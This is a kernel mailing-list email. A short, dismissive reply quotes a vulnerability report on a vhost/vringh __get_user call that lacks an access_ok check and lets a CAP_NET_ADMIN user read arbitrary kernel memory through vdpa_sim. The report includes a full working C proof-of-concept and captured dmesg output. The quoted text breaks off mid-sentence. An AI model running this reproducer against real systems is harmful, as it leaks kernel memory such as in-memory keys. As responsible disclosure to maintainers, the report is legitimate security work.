Received: from mail-wm1-f44.google.com (mail-wm1-f44.google.com [209.85.128.44])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3B2BB3EEAEA
	for <virtualization@lists.linux.dev>; Sat, 17 Oct 2026 21:59:11 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.44
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1792274358; cv=none; b=Ejoe+BLLUuvhasccDmSw83vkNuhfF6Qm+CgVodgaiLzha3AEP7AEQ/8m6E5xhXHStzR4g2y8Tj0jn/tRBhmPqsIeCusl+sHuYqfUDatlQPNpQLLvb7Jm6gfDWds75v1c0nKa+lz+EmXjj3TP7eS+CTlqPbRC+5vvv77lKQN+1IE=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1792274358; c=relaxed/simple;
	bh=6IjtD6adoP4ku7tKJGZ98RNr8Al6oPNzHXUHVkSctqY=;
	h=Date:From:To:Cc:Subject:Message-ID:In-Reply-To:References:
	 MIME-Version:Content-Type; b=Ayt9uV8SrZYut7C+bclKdU43QMTnEbDAZEtpQJFA80HhyjnMr3zm7GMhYVWOUU+GXdwB89aboIz1Xkzex+zs8n5Gmixc44ZdytxpLSeNtFAKgmvy6aNc/MOlyphjO5ui2ZxrrNsNNHeUvldrbzEjoIhIy+izqZfm0mWtbZS30C0=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=BpPPr6qf; arc=none smtp.client-ip=209.85.128.44
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="BpPPr6qf"
Received: by mail-wm1-f44.google.com with SMTP id 5b1f17b1804b1-4a018dc1f98so6922225e9.3
        for <virtualization@lists.linux.dev>; Sat, 17 Oct 2026 14:59:11 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1792274349; x=1792879149; darn=lists.linux.dev;
        h=content-transfer-encoding:content-type:mime-version:references
         :in-reply-to:message-id:subject:cc:to:from:date:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=i4QQ58GJDAGLapBNzE/pzEET3TfiHm0dhF60oG0Wdrk=;
        b=BpPPr6qfJ9xsojorwzxNoeR9OhFwfl3IC05bEUiBEg++yFqhAYTIg5VFBYwJFspl0K
         7pXLc1QS8qvw8/lL7dv8trcwvzw/7KnYleyhjHaI+4EerCzVRNmr0wTTI+fDnpM9vkjq
         yxfcS7ubquxJ7kZcjqPIjOUUkCww5Crv3opna0+9/voq6UE2aNMqHvGEonEkBcSqByiK
         2rqtgYyxsRj9qAagot7wBtryksj+5LmY3dBalaTCCRKh6ayKYkpbiFP2UOEv/N/VlZRt
         TeCQ8ib5P06a711vnb5BtKATsHbP15xW3YG8cSreINMpCHXOpJbmsMES4h5uzx4XWQbT
         oL6g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792274349; x=1792879149;
        h=content-transfer-encoding:content-type:mime-version:references
         :in-reply-to:message-id:subject:cc:to:from:date:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=i4QQ58GJDAGLapBNzE/pzEET3TfiHm0dhF60oG0Wdrk=;
        b=M2zUfncQA8DlFFYqEpWmq5JRDc+0Zy94lGZ6EUvHyWIpy3P1HX7UJ0MlGIhWf5ahpF
         jD7r/N96fcMoM8+cDsY5q78tip+gzsVlIYZbcOCODpw7Gfm2+7jDXDPeMz06GHdrL8na
         +Kjo7SRhbRRdFtaU1r9Li5k+mpmvUwL2ayUrI+FEbbewXvv94C84KIDcmfS4CCs+LBqf
         AeJKWwSY9kcahU0z0IJN/gZvIY0oE50A+zFPEdQAm6inCaHIM7FWoEfqtQvuhjt5L4Dc
         vooqaeC1EpR5WL1XmBa2e54XfH/g5sqBn4qEFv/69Bq2SvMsCaAeruCmfHA/P/AFPDIE
         tILw==
X-Forwarded-Encrypted: i=1; AKwUvByvuXmCms0vZK9gl6+nmKdO1gG4mvhn1G/TqymPJYJr7pnsEciUZAiAgbUf2Yq6iMTp3k7+4/VlaH5Si6LVwA==@lists.linux.dev
X-Gm-Message-State: AFq9FYKt+qTqd18/JFVbUH7za9AjkD1/YLWGq83e1DNLu6xF4LRgXloM
	cnDPrNfxe5nS3sl8mpcR1Tub81tmKpJ0WQho8UDgV0Hrb//RzDbUJJw3
X-Gm-Gg: AYBFou2ntxdniMmBOzKyxXU88dyK8ycWPhkpngXHGNGcpbktvQlZyPYL9E2J6XhK1yg
	VAKfNSggHWGYFX0H5sAjQS+RlBYNWr0mwJtY6XyCiVb9x3JFsToOEFNF7L66md84ndYSsRwzg0H
	aCYxAtN6HJFAm8+DaFa9RoWOULRfg6zW8CP9oZK7ZVlmFtmD14+gIYOafCflHsEhvdY/itPmIhw
	4KKAkYxo0EvFwKrus5KoQ+pYVe7s91FM2mTEkrDXJI1rMqCzdSv8rPSV9mV/GXibzO2OPP9x9L6
	fTnTGaehjZ97am2GD9qNjTXHRiL8SaubiBsHkd+mXuHz0Nvxp7/VI0esraTGuNi6RHMq9sCXLVg
	VeEluUnidrRln2si6olrPbeGdQINhest4gSMHuMYxbBjZ19qM06ASM3rlffAo+tli6dPascAaLQ
	v8pmhgHsnxML3IVmyysLIzo9Sf4Ajds21xwRcR+XhpXQb1YoG5QhG0acsI2pOj9PusGHHPBrVep
	lSEDfrY0DyqOnVdpqqlrF4ulMK+A3UsyX4=
X-Received: by 2002:a05:600c:8b6f:b0:4a1:ce33:1536 with SMTP id 5b1f17b1804b1-4a1d75e37ecmr62071105e9.9.1792274349408;
        Sat, 17 Oct 2026 14:59:09 -0700 (PDT)
Received: from pumpkin (82-69-66-36.dsl.in-addr.zen.co.uk. [82.69.66.36])
        by smtp.gmail.com with ESMTPSA id 5b1f17b1804b1-4a1bd91c55bsm219440545e9.0.2026.10.17.14.59.08
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 17 Oct 2026 14:59:08 -0700 (PDT)
Date: Sat, 17 Oct 2026 22:59:07 +0100
From: David Laight <david.laight.linux@gmail.com>
To: Haoran Wang <haoranwangsec@gmail.com>
Cc: mst@redhat.com, jasowangio@gmail.com, kvm@vger.kernel.org,
 virtualization@lists.linux.dev, netdev@vger.kernel.org,
 eperezma@redhat.com, linux-kernel@vger.kernel.org, security@kernel.org
Subject: Re: [BUG] vhost/vringh: __get_user without access_ok leaks kernel
 memory via vDPA passthrough
Message-ID: <20261017225907.591bc0a1@pumpkin>
In-Reply-To: <6ad07f8a.a0c71a5e.2d2efd.977a@mx.google.com>
References: <6ad07f8a.a0c71a5e.2d2efd.977a@mx.google.com>
X-Mailer: Claws Mail 4.1.1 (GTK 3.24.38; arm-unknown-linux-gnueabihf)
Precedence: bulk
X-Mailing-List: virtualization@lists.linux.dev
List-Id: <virtualization.lists.linux.dev>
List-Subscribe: <mailto:virtualization+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:virtualization+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
Content-Type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 7bit

On Thu, 15 Oct 2026 15:23:45 +0800
Haoran Wang <haoranwangsec@gmail.com> wrote:

> I'd like to report an issue in drivers/vhost/vringh.c:1216 (function
> getu16_iotlb), found via static analysis of Linux 7.0.11 and verified
> against the 7.2.10 source tree. I have reproduced the leak on an
> unmodified 7.2.10 kernel.
> 
> 1. Summary
> getu16_iotlb() calls __get_user(tmp, (__virtio16 __user *)iov_base)
> without an access_ok() check. iov_base originates from iotlb_translate(),
> which only performs an IOTLB interval lookup (vhost_iotlb_itree_first) and
> does not call access_ok(). In the vdpa_sim default passthrough mode the
> entire address space is identity-mapped ([0, ULONG_MAX] -> 0), and
> vdpasim_set_vq_address() stores the controller-supplied vring address
> verbatim with no validation. A controller with CAP_NET_ADMIN can therefore
> set a vring avail_user_addr to a kernel address. On a vq kick the vdpa_sim
> worker reads 2 bytes from that kernel address via __get_user (no
> access_ok). Each vring iteration reads 2 bytes and the value is
> repeatable, yielding an arbitrary-kernel-address 2-byte read. get_user()
> would have rejected a kernel address via access_ok(), while__get_user() does
> not.

Can 'YOU' write that in proper English?
That is just horrid twaddle.

David

> 
> 2. Vulnerable code
> - File: drivers/vhost/vringh.c:1216 (unchanged in 7.2.10)
> - Function: getu16_iotlb
> - Misused API: __get_user
> 
> ```c
> /* drivers/vhost/vringh.c:1216 - getu16_iotlb (IOTLB read helper, per vring iteration) */
> if (vrh->use_va) {
>         ret = __get_user(tmp, (__virtio16 __user *)ivec.iov.iovec[0].iov_base); /* no access_ok */
> }
> 
> /* iov_base comes from iotlb_translate() (IOTLB lookup only, no access_ok) */
> /* drivers/vdpa/vdpa_sim/vdpa_sim.c:157-159 - passthrough identity-maps everything */
> vhost_iotlb_add_range(&iommu, 0, ULONG_MAX, 0, VHOST_MAP_RW);
> /* vdpa_sim.c:297 - set_vq_address stores the controller u64 verbatim, no validation */
> vq->desc_addr = desc_area;   /* controller-controlled = kernel address */
> ```
> 
> 3. Root cause
> get_user() = access_ok() + __get_user(). __get_user() skips access_ok()
> (it expands to __get_user_nocheck, which performs no check_range, whereas
> get_user/put_user expand to the check_range-bearing variants that reject
> kernel addresses). In the vhost-vdpa + vdpa_sim use_va path, the vring
> addresses supplied by the controller (driver_addr/desc_addr) flow through
> iotlb_translate(), which only does a vhost_iotlb_itree_first() interval
> lookup. vdpa_sim's default passthrough IOTLB identity-maps the whole
> address space, so any address passes the lookup. vdpasim_set_vq_address()
> stores the controller's u64 with no user/kernel validation, and
> vhost_vring_set_addr()'s access_ok is skipped in the vhost-vdpa path
> because vq->private_data is never set. Consequently __get_user
> dereferences an attacker-chosen kernel virtual address: the vdpa_sim
> worker runs under kthread_use_mm() in the controller's mm with SMAP
> disabled (STAC), and kernel addresses are mapped there, so 2 bytes of
> kernel memory are read. With num=1, __vringh_get_head() sees head (the
> leaked u16) >= 1 and calls vringh_bad(), which printk's the leaked value
> to dmesg, making the leak externally observable.
> 
> 4. Affected versions
> Present in: Linux 7.0.11. 7.2.10: still present, reproduced on 7.2.10 kernel.
> 
> 5. Trigger / Preconditions
> CAP_NET_ADMIN + vdpa_sim (CONFIG_VDPA_SIM / VDPA_SIM_BLOCK) + use_va mode.
> The controller creates a vdpasim device, binds its mm (VHOST_SET_OWNER,
> enabling use_va), negotiates VIRTIO_F_ACCESS_PLATFORM, sets the vring
> avail_user_addr to a kernel address, enables the vq, sets DRIVER_OK, and
> kicks the vq. The worker then reads 2 bytes at the chosen kernel address.
> 
> 6. Proof of Concept
> Reproduced on Linux 7.2.10 tarball (config-only: CONFIG_KASAN=y, VHOST_VDPA=y, 
> VDPA_SIM=y, VDPA_SIM_BLOCK=y). The trigger sets avail_user_addr = &linux_banner 
> and reads avail->ring[0] (at banner+4). With num=1, the leaked u16 is printk'd 
> by vringh_bad().
> 
> Concrete reproduced evidence (7.2.10):
> - dmesg: "vringh:" then "Guest says index 8312 > 1 is available"
> - leaked value = 8312 = 0x2078 = linux_banner[4]='x'(0x78) |
>   (linux_banner[5]=' '(0x20) << 8)
> - The expected value is independently computable from /proc/version (which
>   prints the same linux_banner): proc_version[4] | (proc_version[5] << 8)
>   = 0x78 | 0x2000 = 0x2078 = 8312. The reproduced value MATCHES.
> - Across 3 boots the banner *address* changed under KASLR
>   (0xffffffff8b517280 / 0xffffffffa3f17280 / 0xffffffff90717280; the
>   trigger resolves it at runtime via /proc/kallsyms), while the leaked
>   *content* was 8312 every time. KASLR only randomizes the address, the 2
>   bytes read there are constant.
> 
> So a CAP_NET_ADMIN controller can read 2 bytes at an arbitrary kernel
> virtual address by setting a vring avail_user_addr to that address and
> kicking the vdpa_sim worker. The value is disclosed to dmesg via
> vringh_bad(). This is an arbitrary-kernel-address 2-byte read on an
> 7.2.10 kernel. 
> 
> Reproducer (vringh_leak.c) -- runs in the QEMU guest as root
> (CAP_NET_ADMIN):
> 
> ```c
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <unistd.h>
> #include <fcntl.h>
> #include <errno.h>
> #include <stdint.h>
> #include <sys/ioctl.h>
> #include <sys/socket.h>
> #include <sys/mman.h>
> #include <linux/netlink.h>
> #include <linux/genetlink.h>
> #include <linux/vhost.h>
> #include <linux/vdpa.h>
> #include <sys/eventfd.h>
> 
> #ifndef VHOST_VDPA
> #define VHOST_VDPA 0xAF
> #endif
> 
> #ifndef VHOST_BACKEND_F_IOTLB_MSG_V2
> #define VHOST_BACKEND_F_IOTLB_MSG_V2 0x1
> #endif
> #ifndef VHOST_BACKEND_F_IOTLB_BATCH
> #define VHOST_BACKEND_F_IOTLB_BATCH 0x2
> #endif
> #ifndef VHOST_BACKEND_F_IOTLB_ASID
> #define VHOST_BACKEND_F_IOTLB_ASID 0x3
> #endif
> #ifndef VHOST_BACKEND_F_ENABLE_AFTER_DRIVER_OK
> #define VHOST_BACKEND_F_ENABLE_AFTER_DRIVER_OK 0x6
> #endif
> 
> static inline int nla_ok_(const struct nlattr *nla, int remaining)
> {
> 	return remaining >= (int)sizeof(struct nlattr) &&
> 	       nla->nla_len >= (int)sizeof(struct nlattr) &&
> 	       nla->nla_len <= remaining;
> }
> static inline struct nlattr *nla_next_(const struct nlattr *nla, int *remaining)
> {
> 	int tot = (int)NLA_ALIGN(nla->nla_len);
> 	*remaining -= tot;
> 	return (struct nlattr *)((char *)nla + tot);
> }
> static inline void *nla_data_(const struct nlattr *nla)
> {
> 	return (char *)nla + NLA_HDRLEN;
> }
> 
> #ifndef VDPA_GENL_NAME
> #define VDPA_GENL_NAME "vdpa"
> #endif
> #ifndef VDPA_GENL_VERSION
> #define VDPA_GENL_VERSION 1
> #endif
> #ifndef VDPA_CMD_DEV_NEW
> #define VDPA_CMD_DEV_NEW 3
> #endif
> #ifndef VDPA_CMD_DEV_DEL
> #define VDPA_CMD_DEV_DEL 4
> #endif
> #ifndef VDPA_ATTR_MGMTDEV_DEV_NAME
> #define VDPA_ATTR_MGMTDEV_DEV_NAME 2
> #endif
> #ifndef VDPA_ATTR_DEV_NAME
> #define VDPA_ATTR_DEV_NAME 4
> #endif
> 
> #define die(fmt, ...) do { fprintf(stderr, "FATAL: " fmt "\n", ##__VA_ARGS__); exit(1); } while (0)
> #define xp(fmt, ...) do { int _e = errno; fprintf(stderr, "ERR " fmt " (%s)\n", ##__VA_ARGS__, strerror(_e)); } while (0)
> 
> static int nlsock;
> static __u32 nlseq = 0;
> 
> static int nla_put_str(struct nlmsghdr *nlh, int len, int type, const char *s)
> {
> 	struct nlattr { __u16 nla_len; __u16 nla_type; } *nla;
> 	int sl = (int)strlen(s) + 1;
> 	int pl = NLA_HDRLEN + sl;
> 	int pad = NLA_ALIGN(sl) - sl;
> 	if (NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(pl) > (size_t)len) return -1;
> 	nla = (void *)nlh + NLMSG_ALIGN(nlh->nlmsg_len);
> 	nla->nla_len = (__u16)pl;
> 	nla->nla_type = (__u16)type;
> 	memcpy((char *)nla + NLA_HDRLEN, s, sl);
> 	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(pl);
> 	(void)pad;
> 	return 0;
> }
> 
> static int genl_resolve_family(const char *name, __u16 *fam_id)
> {
> 	char buf[1024];
> 	struct nlmsghdr *nlh = (void *)buf;
> 	struct genlmsghdr *gh;
> 	memset(buf, 0, sizeof(buf));
> 	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*gh));
> 	nlh->nlmsg_type = GENL_ID_CTRL;
> 	nlh->nlmsg_flags = NLM_F_REQUEST;
> 	nlh->nlmsg_seq = ++nlseq;
> 	gh = NLMSG_DATA(nlh);
> 	gh->cmd = CTRL_CMD_GETFAMILY;
> 	gh->version = 1;
> 	nla_put_str(nlh, sizeof(buf), CTRL_ATTR_FAMILY_NAME, name);
> 	struct sockaddr_nl dst = { .nl_family = AF_NETLINK };
> 	struct iovec iov = { .iov_base = nlh, .iov_len = nlh->nlmsg_len };
> 	struct msghdr msg = { .msg_name = &dst, .msg_namelen = sizeof(dst), .msg_iov = &iov, .msg_iovlen = 1 };
> 	if (sendmsg(nlsock, &msg, 0) < 0) { xp("sendmsg getfamily"); return -1; }
> 	char rbuf[4096];
> 	struct iovec riov = { .iov_base = rbuf, .iov_len = sizeof(rbuf) };
> 	struct msghdr rmsg = { .msg_name = &dst, .msg_namelen = sizeof(dst), .msg_iov = &riov, .msg_iovlen = 1 };
> 	ssize_t n = recvmsg(nlsock, &rmsg, 0);
> 	if (n < 0) { xp("recvmsg getfamily"); return -1; }
> 	struct nlmsghdr *r = (void *)rbuf;
> 	if (!NLMSG_OK(r, (size_t)n)) return -1;
> 	if (r->nlmsg_type == NLMSG_ERROR) { struct nlmsgerr *e = NLMSG_DATA(r); fprintf(stderr, "genl getfamily error %d\n", e->error); return -1; }
> 	int hlen = GENL_HDRLEN;
> 	struct nlattr *na = (void *)r + NLMSG_HDRLEN + hlen;
> 	int rem = (int)(r->nlmsg_len - NLMSG_HDRLEN - hlen);
> 	*fam_id = 0;
> 	for (; nla_ok_(na, rem); na = nla_next_(na, &rem)) {
> 		if (na->nla_type == CTRL_ATTR_FAMILY_ID) {
> 			*fam_id = *(__u16 *)nla_data_(na);
> 			return 0;
> 		}
> 	}
> 	return -1;
> }
> 
> static int genl_dev_new(__u16 fam, const char *mgmtdev, const char *devname)
> {
> 	char buf[1024];
> 	struct nlmsghdr *nlh = (void *)buf;
> 	struct genlmsghdr *gh;
> 	memset(buf, 0, sizeof(buf));
> 	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*gh));
> 	nlh->nlmsg_type = fam;
> 	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
> 	nlh->nlmsg_seq = ++nlseq;
> 	gh = NLMSG_DATA(nlh);
> 	gh->cmd = VDPA_CMD_DEV_NEW;
> 	gh->version = VDPA_GENL_VERSION;
> 	if (nla_put_str(nlh, sizeof(buf), VDPA_ATTR_MGMTDEV_DEV_NAME, mgmtdev) < 0) return -1;
> 	if (nla_put_str(nlh, sizeof(buf), VDPA_ATTR_DEV_NAME, devname) < 0) return -1;
> 	struct sockaddr_nl dst = { .nl_family = AF_NETLINK };
> 	struct iovec iov = { .iov_base = nlh, .iov_len = nlh->nlmsg_len };
> 	struct msghdr msg = { .msg_name = &dst, .msg_namelen = sizeof(dst), .msg_iov = &iov, .msg_iovlen = 1 };
> 	if (sendmsg(nlsock, &msg, 0) < 0) { xp("sendmsg dev_new"); return -1; }
> 	char rbuf[4096];
> 	struct iovec riov = { .iov_base = rbuf, .iov_len = sizeof(rbuf) };
> 	struct msghdr rmsg = { .msg_name = &dst, .msg_namelen = sizeof(dst), .msg_iov = &riov, .msg_iovlen = 1 };
> 	ssize_t n = recvmsg(nlsock, &rmsg, 0);
> 	if (n < 0) { xp("recvmsg dev_new"); return -1; }
> 	struct nlmsghdr *r = (void *)rbuf;
> 	if (!NLMSG_OK(r, (size_t)n)) return -1;
> 	if (r->nlmsg_type == NLMSG_ERROR) {
> 		struct nlmsgerr *e = NLMSG_DATA(r);
> 		if (e->error == 0)
> 			return 0;
> 		fprintf(stderr, "dev_new error %d (%s)\n", e->error, strerror(-e->error));
> 		return -1;
> 	}
> 	return 0;
> }
> 
> static int genl_dev_del(__u16 fam, const char *devname)
> {
> 	char buf[1024];
> 	struct nlmsghdr *nlh = (void *)buf;
> 	struct genlmsghdr *gh;
> 	memset(buf, 0, sizeof(buf));
> 	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*gh));
> 	nlh->nlmsg_type = fam;
> 	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
> 	nlh->nlmsg_seq = ++nlseq;
> 	gh = NLMSG_DATA(nlh);
> 	gh->cmd = VDPA_CMD_DEV_DEL;
> 	gh->version = VDPA_GENL_VERSION;
> 	nla_put_str(nlh, sizeof(buf), VDPA_ATTR_DEV_NAME, devname);
> 	struct sockaddr_nl dst = { .nl_family = AF_NETLINK };
> 	struct iovec iov = { .iov_base = nlh, .iov_len = nlh->nlmsg_len };
> 	struct msghdr msg = { .msg_name = &dst, .msg_namelen = sizeof(dst), .msg_iov = &iov, .msg_iovlen = 1 };
> 	sendmsg(nlsock, &msg, 0);
> 	char rbuf[4096]; struct iovec riov = { .iov_base = rbuf, .iov_len = sizeof(rbuf) };
> 	struct msghdr rmsg = { .msg_name = &dst, .msg_namelen = sizeof(dst), .msg_iov = &riov, .msg_iovlen = 1 };
> 	recvmsg(nlsock, &rmsg, 0);
> 	return 0;
> }
> 
> static unsigned long ksym(const char *want)
> {
> 	FILE *f = fopen("/proc/kallsyms", "r");
> 	if (!f) return 0;
> 	char line[512];
> 	unsigned long a = 0;
> 	while (fgets(line, sizeof(line), f)) {
> 		char type; char name[256];
> 		if (sscanf(line, "%lx %c %255s", &a, &type, name) == 3) {
> 			if (strcmp(name, want) == 0) { fclose(f); return a; }
> 		}
> 	}
> 	fclose(f);
> 	return 0;
> }
> 
> static int expected_leak(unsigned *out)
> {
> 	FILE *f = fopen("/proc/version", "r");
> 	if (!f) return -1;
> 	char v[256];
> 	if (!fgets(v, sizeof(v), f)) { fclose(f); return -1; }
> 	fclose(f);
> 	int len = (int)strlen(v);
> 	if (len < 6) return -1;
> 	unsigned m = ((unsigned)(unsigned char)v[4]) | (((unsigned)(unsigned char)v[5]) << 8);
> 	*out = m;
> 	fprintf(stderr, "[*] /proc version bytes[4,5] = 0x%02x 0x%02x  => expected leak M = 0x%04x (%u)\n",
> 		(unsigned char)v[4], (unsigned char)v[5], m, m);
> 	fprintf(stderr, "[*] /proc/version = %.40s\n", v);
> 	return 0;
> }
> 
> int main(int argc, char **argv)
> {
> 	unsigned exp;
> 	if (expected_leak(&exp)) die("cannot read /proc/version");
> 	unsigned long banner = ksym("linux_banner");
> 	fprintf(stderr, "[*] linux_banner @ 0x%lx\n", banner);
> 	if (!banner) die("linux_banner not in /proc/kallsyms (need root)");
> 
> 	nlsock = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
> 	if (nlsock < 0) die("netlink socket");
> 	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
> 	if (bind(nlsock, (struct sockaddr *)&sa, sizeof(sa)) < 0) die("netlink bind");
> 	__u16 fam;
> 	if (genl_resolve_family(VDPA_GENL_NAME, &fam)) die("resolve genl family 'vdpa' (CONFIG_VDPA?)");
> 	fprintf(stderr, "[*] genl family 'vdpa' id=%u\n", fam);
> 	if (genl_dev_new(fam, "vdpasim_blk", "sim0")) die("dev_new vdpasim_blk (CONFIG_VDPA_SIM_BLOCK?)");
> 	fprintf(stderr, "[*] created vdpa device sim0 (vdpasim_blk)\n");
> 
> 	char path[64]; int vfd = -1;
> 	for (int i = 0; i < 50; i++) {
> 		snprintf(path, sizeof(path), "/dev/vhost-vdpa-%d", i);
> 		vfd = open(path, O_RDWR | O_CLOEXEC);
> 		if (vfd >= 0) break;
> 	}
> 	if (vfd < 0) die("open /dev/vhost-vdpa-*");
> 	fprintf(stderr, "[*] opened %s fd=%d\n", path, vfd);
> 
> 	int callfd = eventfd(0, EFD_CLOEXEC);
> 	int kickfd = eventfd(0, EFD_CLOEXEC);
> 	if (callfd < 0 || kickfd < 0) die("eventfd");
> 
> 	if (ioctl(vfd, VHOST_SET_OWNER)) die("VHOST_SET_OWNER");
> 
> 	__u64 bf = 0;
> 	if (ioctl(vfd, VHOST_GET_BACKEND_FEATURES, &bf)) xp("get_backend_features");
> 	__u64 setbf = bf | (1ULL << VHOST_BACKEND_F_IOTLB_MSG_V2)
> 	               | (1ULL << VHOST_BACKEND_F_IOTLB_BATCH)
> 	               | (1ULL << VHOST_BACKEND_F_IOTLB_ASID)
> 	               | (1ULL << VHOST_BACKEND_F_ENABLE_AFTER_DRIVER_OK);
> 	if (ioctl(vfd, VHOST_SET_BACKEND_FEATURES, &setbf)) xp("set_backend_features");
> 
> 	__u64 feat = 0;
> 	if (ioctl(vfd, VHOST_GET_FEATURES, &feat)) die("get_features");
> 	__u64 ack = 0;
> 	ack |= (1ULL << VIRTIO_F_ACCESS_PLATFORM);
> 	ack |= (1ULL << VIRTIO_F_VERSION_1);
> 	ack |= (1ULL << VIRTIO_F_ANY_LAYOUT);
> 	ack &= feat;
> 	if (!(ack & (1ULL << VIRTIO_F_ACCESS_PLATFORM))) die("ACCESS_PLATFORM not supported - no use_va?");
> 	if (ioctl(vfd, VHOST_SET_FEATURES, &ack)) die("set_features (need ACCESS_PLATFORM)");
> 
> 	struct vhost_vring_state vs = { .index = 0, .num = 1 };
> 	if (ioctl(vfd, VHOST_SET_VRING_NUM, &vs)) die("set_vring_num");
> 
> 	size_t pg = 4096;
> 	void *descbuf = mmap(NULL, pg, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
> 	void *usedbuf = mmap(NULL, pg, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
> 	if (descbuf == MAP_FAILED || usedbuf == MAP_FAILED) die("mmap");
> 	memset(descbuf, 0, pg); memset(usedbuf, 0, pg);
> 
> 	struct vhost_vring_addr va = {0};
> 	va.index = 0;
> 	va.flags = 0;
> 	va.desc_user_addr  = (uintptr_t)descbuf;
> 	va.avail_user_addr = (uintptr_t)banner;   /* <-- KERNEL address, the leak source */
> 	va.used_user_addr  = (uintptr_t)usedbuf;
> 	va.log_guest_addr  = 0;
> 	if (ioctl(vfd, VHOST_SET_VRING_ADDR, &va)) die("set_vring_addr (avail=kernel addr rejected?)");
> 
> 	struct vhost_vring_state base = { .index = 0, .num = 0 };
> 	if (ioctl(vfd, VHOST_SET_VRING_BASE, &base)) die("set_vring_base");
> 
> 	struct vhost_vring_file cf = { .index = 0, .fd = callfd };
> 	if (ioctl(vfd, VHOST_SET_VRING_CALL, &cf)) die("set_vring_call");
> 	struct vhost_vring_file kf = { .index = 0, .fd = kickfd };
> 	if (ioctl(vfd, VHOST_SET_VRING_KICK, &kf)) die("set_vring_kick");
> 
> 	struct vhost_vring_state en = { .index = 0, .num = 1 };
> 	if (ioctl(vfd, VHOST_VDPA_SET_VRING_ENABLE, &en)) die("set_vring_enable");
> 
> 	__u8 status = VIRTIO_CONFIG_S_ACKNOWLEDGE | VIRTIO_CONFIG_S_DRIVER
> 	            | VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER_OK;
> 	if (ioctl(vfd, VHOST_VDPA_SET_STATUS, &status)) die("set_status DRIVER_OK");
> 
> 	uint64_t one = 1;
> 	if (write(kickfd, &one, sizeof(one)) != sizeof(one)) die("kick write");
> 
> 	unsigned leaked = 0; int found = 0;
> 	for (int try = 0; try < 20 && !found; try++) {
> 		usleep(100000);
> 		FILE *d = popen("dmesg 2>/dev/null", "r");
> 		if (d) {
> 			char l[512];
> 			while (fgets(l, sizeof(l), d)) {
> 				char *p = strstr(l, "Guest says index");
> 				if (p) {
> 					unsigned idx = 0, numv = 0;
> 					if (sscanf(p, "Guest says index %u > %u is available",
> 						   &idx, &numv) >= 1) {
> 						leaked = idx; found = 1;
> 						fprintf(stderr, "[!!] dmesg: %s", l);
> 						break;
> 					}
> 				}
> 			}
> 			pclose(d);
> 		}
> 	}
> 
> 	if (!found) {
> 		fprintf(stderr, "[!] no vringh_bad leak line in dmesg; dumping tail:\n");
> 		FILE *d = popen("dmesg 2>/dev/null | tail -40", "r");
> 		if (d) { char l[512]; while (fgets(l, sizeof(l), d)) fputs(l, stderr); pclose(d); }
> 		die("leak not observed (worker may not have run, or use_va/mm_bound not set)");
> 	}
> 
> 	fprintf(stderr, "\n=== RESULT ===\n");
> 	fprintf(stderr, "leaked kernel u16 @ linux_banner+4 = 0x%04x (%u)\n", leaked, leaked);
> 	fprintf(stderr, "expected (/proc/version[4,5])     = 0x%04x (%u)\n", exp, exp);
> 	if (leaked == exp) {
> 		fprintf(stderr, "MATCH: __get_user read 2 bytes at kernel addr 0x%lx via vringh.c:1216\n", banner + 4);
> 		fprintf(stderr, "PROVEN: arbitrary-kernel-address 2-byte read (no access_ok) on unmodified kernel\n");
> 	} else {
> 		fprintf(stderr, "MISMATCH - investigate\n");
> 	}
> 
> 	status = 0; ioctl(vfd, VHOST_VDPA_SET_STATUS, &status);
> 	close(vfd); close(callfd); close(kickfd);
> 	genl_dev_del(fam, "sim0");
> 	return (leaked == exp) ? 0 : 2;
> }
> ```
> 
> Captured dmesg from the 7.2.10 run (the disclosed leaked value):
> ```
> [    1.882938] vringh:
> [    1.882944] Guest says index 8312 > 1 is available
> ```
> 
> 7. Impact
> Privileged kernel memory information leak: a CAP_NET_ADMIN controller can
> read 2 bytes at an arbitrary kernel virtual address per vring kick via
> __get_user() with no access_ok(), and the value is disclosed to dmesg via
> vringh_bad(). The read is repeatable, so the whole kernel address space
> can be scanned 2 bytes at a time (kernel .text/.data, structure contents,
> in-memory keys). CAP_NET_ADMIN should not grant arbitrary kernel-memory
